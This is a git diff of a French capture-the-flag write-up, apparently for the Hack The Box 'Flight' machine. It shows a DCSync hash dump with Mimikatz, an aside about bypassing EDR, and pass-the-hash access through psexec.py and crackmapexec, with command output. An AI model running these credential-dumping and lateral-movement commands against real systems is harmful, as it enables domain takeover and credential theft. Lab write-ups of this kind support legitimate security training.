@@ -2,10 +2,10 @@
 public: true # set to true to make the article publishable
 ---
 
-
 ## dump de la base NTDS.DIT
 
 Penser à bypasser l'EDR en place !!
+
 - On upload `Mimikatz.exe`
 - On exécute ensuite : `mimikatz.exe "lsadump::dcsync /domain:flight.htb /all /csv"`
 ![[Flight-13.png]]
@@ -21,7 +21,6 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] SMBv3.0 dialect used
 flight\administrator
 ```
-
 
 ```shell title="Utilisation du Hash NT récupéré avec psexec.py"
 $ psexec.py Administrator@$TARGET_IP -hashes :43bbfc530bab76141b12c8446e30c17c
@@ -40,7 +39,6 @@ Microsoft Windows [Version 10.0.17763.2989]
 C:\Windows\system32> whoami
 nt authority\system
 ```
-
 
 ```shell title="Utilisation du Hash NT récupéré avec crackmapexec"
 └─$ cme smb $TARGET_IP -u Administrator -H 43bbfc530bab76141b12c8446e30c17c --shares | cut -c60-
